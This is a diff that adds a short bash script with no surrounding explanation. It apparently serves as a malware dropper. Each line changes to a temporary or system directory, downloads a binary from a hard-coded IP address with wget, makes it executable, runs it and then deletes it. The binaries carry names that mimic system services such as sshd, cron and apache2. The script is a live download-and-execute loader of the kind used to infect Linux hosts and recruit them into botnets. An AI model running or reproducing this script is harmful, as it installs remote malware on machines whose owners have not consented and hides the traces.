@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilntpd; chmod +x Devilntpd; ./Devilntpd; rm -rf Devilntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilsshd; chmod +x Devilsshd; ./Devilsshd; rm -rf Devilsshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilopenssh; chmod +x Devilopenssh; ./Devilopenssh; rm -rf Devilopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilbash; chmod +x Devilbash; ./Devilbash; rm -rf Devilbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Deviltftp; chmod +x Deviltftp; ./Deviltftp; rm -rf Deviltftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilwget; chmod +x Devilwget; ./Devilwget; rm -rf Devilwget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilcron; chmod +x Devilcron; ./Devilcron; rm -rf Devilcron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilftp; chmod +x Devilftp; ./Devilftp; rm -rf Devilftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilpftp; chmod +x Devilpftp; ./Devilpftp; rm -rf Devilpftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilsh; chmod +x Devilsh; ./Devilsh; rm -rf Devilsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Devilapache2; chmod +x Devilapache2; ./Devilapache2; rm -rf Devilapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/Deviltelnetd; chmod +x Deviltelnetd; ./Deviltelnetd; rm -rf Deviltelnetd
